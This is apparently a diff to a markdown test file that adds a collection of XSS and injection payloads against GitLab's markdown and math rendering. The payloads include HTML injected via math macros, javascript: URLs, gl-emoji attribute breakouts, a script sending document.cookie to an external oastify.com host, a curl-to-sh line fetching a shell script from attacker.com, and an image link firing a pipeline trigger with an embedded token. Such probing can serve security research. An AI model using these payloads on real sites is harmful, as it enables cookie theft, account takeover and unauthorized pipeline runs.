@@ -122,3 +122,139 @@ $`\html{<!--<div>-->
 >✅</gl-emoji>}`$
 
 $$\href{ \css{:target { background: url("javascript:alert(1)") } } }{}$$
+
+
+
+
+
+## Deep seek:3
+
+$$\html{<img src=x onerror=alert(document.domain)>}$$
+\href{javascript:alert(1)}{Click Here}
+\url{javascript:alert`XSS`}
+
+$$\begin{array}{c}\end{array}<!-- --><svg/onload=alert(1)>$$
+
+<gl-emoji 
+  data-name='" onmouseover="alert(1)'
+  data-unicode-version='" id="x" style="color:red;"
+>
+  😊
+</gl-emoji>
+
+
+
+\css{body{background:red;}}
+\class{test}{ \style{background:url("javascript:alert(1)")} }
+
+
+
+
+
+$$\html{<form id=attributes><input name=href></form>}$$
+<a id=attributes href="javascript:alert(1)">Click</a>
+
+
+
+\def\pipeline{!include .gitlab-ci.yml}
+\pipeline{image: alpine\nscript: - curl attacker.com/shell.sh | sh}
+
+
+
+
+\html{<%
+<%= 7*7 %>
+<% throw new Error("test") %>
+%>}
+
+## New TEst
+ \begin{align*}
+    \html{<iframe/src="x"/onload=alert`1`>}
+    \end{align*}
+
+
+$`\html{<!--<div>-->
+<gl-emoji 
+  data-name="x\" style=\"animation: x;"
+  data-unicode-version="x\">@keyframes x{from{background:url('?')}to{background:url('javascript:alert(1)')}}"
+>✅</gl-emoji>}`$
+
+$$\href{ \css{:target { background: url("javascript:alert(1)") } } }{}$$
+
+
+
+
+## Brand New Testing
+
+
+<gl-emoji
+  data-name='" onmouseover="alert(1)'
+  data-unicode-version='" id="x" style="color:red;"'
+>😊</gl-emoji>
+
+
+
+
+
+
+<gl-emoji
+  data-name='x" style="animation:x;"'
+  data-unicode-version='x">@keyframes x{from{background:url(?)}to{background:url(javascript:alert(document.domain))}}'
+>✅</gl-emoji>
+
+
+
+
+\def\inject{</div><svg/onload=alert(1)>}
+\inject{}
+
+
+
+
+<gl-emoji 
+  data-name='x" onload="alert(1)"'
+  data-unicode-version='x" id="x"'
+>⚠️</gl-emoji>
+
+<script>
+  // Element clobbering follow-up
+  window.onload = () => {
+    x.onclick = () => fetch('https://ygifnjredswxkv6quiij7gw46vcp0e.oastify.com?cookie='+document.cookie);
+  };
+</script>
+
+
+
+\newcommand{\malicious}{@keyframes x\{from\{background:url(?)\}to\{background:url('javascript:alert(1)')\}}}
+<style> body { animation: \malicious; } </style>
+
+
+![Pipeline Trigger](https://gitlab.com/api/v4/projects/72411183/trigger/pipeline?token=glptt-c8b9736d53d51a85ca7d7fbf945b94baee1e1968&ref=main)
+
+
+
+<gl-emoji
+  data-name='x" onmouseover="alert(document.domain)"'
+  data-unicode-version='x" style="transition:all 1s;transform:rotate(360deg);"'
+>🎯</gl-emoji>
+
+
+
+\begin{array}{c}\end{array}<!-- 
+--><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+
+
+<gl-emoji
+  data-name='x" class="'
+  data-unicode-version='x"></gl-emoji><style>.vulnerable { background: url(javascript:alert(1)); }</style>'
+>🔥</gl-emoji>
+
+
+
+
+
+
+
+
+
+
